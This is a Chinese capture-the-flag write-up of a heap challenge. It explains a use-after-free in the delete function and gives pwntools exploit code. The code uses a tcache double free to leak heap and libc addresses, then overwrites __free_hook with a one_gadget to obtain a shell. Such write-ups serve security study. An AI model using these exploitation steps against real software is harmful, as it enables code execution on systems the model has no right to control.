程序分析

checksec可以看到保护全开

在IDA中打开分析程序，可以看到堆题中常见的三个功能：add、show、delete

其中add函数无明显漏洞，但在创建堆块时有做要求，即数量不能大于8、大小不能小于0x80 不能大于0x400

show 函数即正常的打印content中的数据

delete函数中在对堆块free过后，未对其指针进行清零，即出现UAF漏洞

利用过程

  1. 泄露heap地址

    由于前面创建堆块时的种种限制，对此我们可以利用doublefree的方式将堆块申请到tcache中，但前提我们需要先得到堆块的地址

        add(0x80,"a") #idx_0
        dele(0)
        dele(0)
        show(0)
        sh.recvuntil("Content: ")
        heap_addr = u64(sh.recv(6).ljust(8,b"\x00"))-0x260
        success("heap_addr => 0x%x",heap_addr)

  2. 控制tcache，泄露libc地址

    得到堆块地址后，继续通过doublefree，控制堆块申请到tcache结构体上，同时设置其0x90大小的堆块数量超过7，即可在下一次free该大小的堆块时，使其跳出tcache，从而进入unsortedbin中，进而得到其fd、bk指针中的main_arena的地址

     add(0x80,p64(heap_addr))    #idx_1
        add(0x80,"a")   #idx_2
        add(0x80,p64(0)+p64(0x250)+p64(0x1000000000000000))#idx_3
        add(0x90,"b") #下一步用
        dele(1)
        show(1)
        sh.recvuntil("Content: ")
        main_arena96 = u64(sh.recvuntil(b"\x7f")[:6].ljust(8,b"\x00"))
        libc_base = main_arena96-96-0x10-libc.sym["__malloc_hook"]
        free_hook = libc_base + libc.sym["__free_hook"]
        one_gg = one_ggs[1]+libc_base
        success("libc_base => 0x%x",libc_base)
        success("free_hook => 0x%x",free_hook)
        success("one_gg => 0x%x",one_gg)

  3. 写onegg到freehook

    通过上一步创建的0x90的堆块，再次利用doublefree将堆块申请到free_hook中，并写入one_gadget即可getshell

        dele(3)
        dele(3)
        add(0x90,p64(free_hook))
        add(0x90,p64(0))
        add(0x90,p64(one_gg))
        sh.sendlineafter("Your choice :","3")
        sh.sendlineafter("Index :","3")
